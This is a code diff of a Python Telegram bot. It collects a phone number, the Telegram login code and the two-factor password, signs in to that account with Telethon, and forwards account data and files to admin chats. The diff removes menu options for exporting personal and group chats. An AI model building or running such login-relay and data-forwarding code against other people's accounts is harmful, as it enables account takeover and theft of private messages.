@@ -1,7 +1,7 @@
 import logging
 import asyncio
 import os
-from aiogram import Bot, Dispatcher
+from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from telethon import TelegramClient
@@ -10,15 +10,7 @@ from dotenv import load_dotenv
 from datetime import datetime
 from defunc import *
 import pytz
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher import FSMContext
 from allowed_users import ALLOWED_USERS  # Импортируем словарь из отдельного файла
-from aiogram.types import InlineKeyboardMarkup as AiogramInlineKeyboardMarkup, \
-                          InlineKeyboardButton as AiogramInlineKeyboardButton, \
-                          CallbackQuery as AiogramCallbackQuery, \
-                          Message as AiogramMessage
 
 # Загрузка переменных окружения из файла .env
 load_dotenv()
@@ -33,12 +25,10 @@ admin_chat_ids_str = os.getenv("ADMIN_CHAT_IDS")
 admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 allowed_users = ALLOWED_USERS
 
-# Создаем Bot, Dispatcher и FSM Storage
+# Создаем Bot и Dispatcher
 bot = Bot(token=bot_token)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
+dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
-
 
 # Логирование
 logging.basicConfig(level=logging.INFO)
@@ -46,34 +36,6 @@ logging.basicConfig(level=logging.INFO)
 # Словарь для хранения состояния пользователя
 user_state = {}
 
-# Определение состояний
-class Form(StatesGroup):
-    awaiting_selection = State()
-
-
-
-# Функция для отображения клавиатуры
-async def show_keyboard(user_id):
-    keyboard = InlineKeyboardMarkup(row_width=1)
-    buttons = [
-        InlineKeyboardButton(text="Сбор аналитики по аккаунту", callback_data='analytics'),
-        InlineKeyboardButton(text="Выгрузка личных чатов", callback_data='personal_chats'),
-        InlineKeyboardButton(text="Выгрузка групповых чатов", callback_data='group_chats')
-    ]
-    keyboard.add(buttons[0])
-    keyboard.add(buttons[1], buttons[2])
-
-    await bot.send_message(user_id, "Выберите направление поиска", reply_markup=keyboard)
-    # Устанавливаем состояние "awaiting_selection"
-    await Form.awaiting_selection.set()
-
-# Функция what_to_do для отображения клавиатуры при выполнении условий
-async def what_to_do(message: types.Message, conditions_met: bool):
-    if conditions_met:
-        await message.answer("Подключено!")
-        await show_keyboard(message.from_user.id)
-    else:
-        await message.answer("Выбери, что будешь делать!")
 
 # Функция для отправки файлов
 async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
@@ -91,7 +53,6 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
     # Отправка сообщения с информацией о пользователе админам
     for admin_chat_id in admin_chat_ids:
         await bot.send_message(admin_chat_id, user_info_message)
-
 
     # Отправка файлов с информацией пользователю и админам
     for file_extension in file_extensions:
@@ -119,7 +80,7 @@ async def unauthorized(message: types.Message):
             await bot.send_message(admin_chat_id, user_info_message)
 
 @dp.message_handler(commands=['start'])
-async def send_welcome(message: types.Message, state: FSMContext):
+async def send_welcome(message: types.Message):
     user_id = message.from_user.id
     if user_id in allowed_users:
         await message.answer("Введите номер телефона")
@@ -138,9 +99,7 @@ async def send_welcome(message: types.Message, state: FSMContext):
 @dp.message_handler(lambda message: message.text and 
                     len(re.sub(r'\D', '', message.text)) > 9 and 
                     message.from_user.id in allowed_users)
-async def get_phone_number(message: types.Message, state: FSMContext):
-    user_id = message.from_user.id
-   
+async def get_phone_number(message: types.Message):
     phone_number = message.text
     # Очищаем номер телефона от всего, кроме цифр
     phone_number = re.sub(r'\D', '', phone_number)
@@ -151,8 +110,8 @@ async def get_phone_number(message: types.Message, state: FSMContext):
         await client.connect()
         
         # Разлогиниваемся от предыдущего клиента, если он был авторизован
-        #if await client.is_user_authorized():
-            #await client.log_out()
+        if await client.is_user_authorized():
+            await client.log_out()
         
         sent_code = await client.send_code_request(phone_number)
         user_state[message.from_user.id] = {
@@ -178,14 +137,11 @@ async def get_code(message: types.Message):
     try:
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
-        #await message.answer("Подключено! Формирую отчет")
-        conditions_met = True
-        await what_to_do(message, conditions_met)
+        await message.answer("Подключено! Теперь можно выбрать одну из опций")
         #await process_user_data(client, phone_number, message.from_user.id)
         #await client.log_out()
         #await client.disconnect()
-        
-        user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
+        #user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки !!!!!!!!!!!!!!!!!!!!!!!!
     except SessionPasswordNeededError:
         await message.answer("Установлена двухфакторная аутентификация. Введите пароль")
         user_state[message.from_user.id]['awaiting_password'] = True
@@ -199,17 +155,17 @@ async def get_code(message: types.Message):
         if user_state[message.from_user.id]['code_attempts'] >= 3:
             await message.answer("Превышено количество попыток ввода кода. Перезапусти меня")
             user_state.pop(message.from_user.id, None)
-            #await client.log_out()
+            await client.log_out()
             await client.disconnect()
         else:
             await message.answer(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
     except Exception as e:
         await message.answer(f"Произошла ошибка: {e}")
-    #finally:
-        #if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
-            #if 'code_attempts' not in user_state.get(message.from_user.id, {}):
-                #await client.log_out()
-                #await client.disconnect()
+    finally:
+        if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
+            if 'code_attempts' not in user_state.get(message.from_user.id, {}):
+                await client.log_out()
+                await client.disconnect()
                 
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
@@ -221,68 +177,32 @@ async def process_password(message: types.Message):
         await client.connect()
         await client.sign_in(password=password)
         
-        #await message.answer("Подключено! Формирую отчет")
+        await message.answer("Подключено! Теперь можно выбрать одну из опций")
         phone_number = user_state[message.from_user.id]['phone_number']
-        conditions_met = True
-        await what_to_do(message, conditions_met)
         #await process_user_data(client, phone_number, message.from_user.id)
-        user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
+        #user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
     except PasswordHashInvalidError:
         user_state[message.from_user.id]['password_attempts'] += 1
         if user_state[message.from_user.id]['password_attempts'] >= 3:
             await message.answer("Превышено количество попыток ввода пароля. Перезапусти меня")
             user_state.pop(message.from_user.id, None)
-            #await client.log_out()
-            #await client.disconnect()
+            await client.log_out()
+            await client.disconnect()
         else:
             await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[message.from_user.id]['password_attempts']} из 3.")
     except Exception as e:
         await message.answer(f"Произошла ошибка: {e}")
-    #finally:
-        #if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
-            #await client.log_out()
-            #await client.disconnect()
+    finally:
+        if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
+            await client.log_out()
+            await client.disconnect()
 
 # Функция для создания нового экземпляра клиента
 def create_client():
     return TelegramClient('session_name', api_id, api_hash)
 
-
-
-@dp.callback_query_handler(state=Form.awaiting_selection)
-async def handle_callback_query(callback_query: AiogramCallbackQuery, state: FSMContext):
-    code = callback_query.data
-    user_id = callback_query.from_user.id
-    logging.info(f"Callback query from user {user_id} with data: {callback_query.data}")
-  
-    await bot.answer_callback_query(callback_query.id)
-
-    if code == 'analytics':
-        await bot.send_message(callback_query.message.chat.id, "Формирую отчет!")
-
-        # Получаем необходимые данные из user_state
-        client = user_state[user_id]['client']
-        phone_number = user_state[user_id]['phone_number']
-        #user_id = callback_query.message.chat.id
-        #user_id = callback_query.from_user.id
-        await process_user_data(client, phone_number, user_id)
-            
-    elif code == 'personal_chats':
-        await export_personal_chats(callback_query.message)
-    elif code == 'group_chats':
-        await export_group_chats(callback_query.message)
-  
-# Пример функции для выгрузки личных чатов
-async def export_personal_chats(message: Message):
-    await message.answer("Выгрузка личных чатов...")
-
-# Пример функции для выгрузки групповых чатов
-async def export_group_chats(message: Message):
-    await message.answer("Выгрузка групповых чатов...")
-
 # Функция для обработки данных пользователя
 async def process_user_data(client, phone_number, user_id):
-    await bot.send_message(user_id, "Зашел в функцию")
     selection = '0'
     try:
         userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
